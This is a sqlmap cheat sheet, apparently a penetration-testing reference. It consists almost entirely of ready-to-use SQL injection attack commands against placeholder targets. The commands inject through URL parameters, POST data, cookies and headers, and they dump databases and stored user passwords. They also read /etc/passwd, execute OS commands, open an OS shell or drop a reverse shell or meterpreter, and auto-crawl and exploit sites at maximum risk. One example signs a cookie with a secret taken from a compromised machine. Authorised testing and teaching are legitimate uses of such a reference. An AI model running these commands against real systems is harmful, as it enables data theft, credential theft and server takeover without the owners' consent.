# SQLmapCheatSheet



## Basic arguments for SQLmap
Generic ->
-   -u " < URL > " 
-   -p "<PARAM TO TEST>" 
-   --user-agent=SQLMAP 
-   --random-agent 
-   --threads=10 
-   --risk=3 #MAX
-   --level=5 #MAX
-   --dbms="<KNOWN DB TECH>" 
-   --os="<OS>"
-   --technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
-   --batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
-   --auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
-   --auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
-   --proxy=http://127.0.0.1:8080
-   --union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char

## Retrieve Information
Internal
-   --current-user #Get current user
-   --is-dba #Check if current user is Admin
-   --hostname #Get hostname
-   --users #Get usernames od DB
-   --passwords #Get passwords of users in DB
-   --privileges #Get privileges


## DB data
-   --all #Retrieve everything
-   --dump #Dump DBMS database table entries
-   --dbs #Names of the available databases
-   --tables #Tables of a database ( -D <DB NAME> )
-   --columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-   -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column


## Injection place
-   From BurpSuite/ZAP capture
-   Capture the request and create a req.txt file!
-   [sqlmap -r req.txt --current-user]

## GET Request Injection
-   sqlmap -u "http://example.com/?id=1" -p id
-   sqlmap -u "http://example.com/?id=*" -p id

## POST Request Injection
-   sqlmap -u "http://example.com" --data "username=*&password=*"

 
## Injections in Headers and other HTTP Methods
# Inside cookie
-   sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
#The injection is located at the '*'





Indicate string when injection is successful
--string="string_showed_when_TRUE" 


Eval
Sqlmap allows the use of -e or --eval to process each payload before sending it with some python oneliner. This makes very easy and fast to process in custom ways the payload before sending it. In the following example the flask cookie session is signed by flask with the known secret before sending it:
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump



Shell
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn



Read File
--file-read=/etc/passwd


Crawl a website with SQLmap and auto-exploit ->
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms


Second Order Injection
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs


Set a suffix
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "


Prefix
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "


Help finding boolean injection
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch

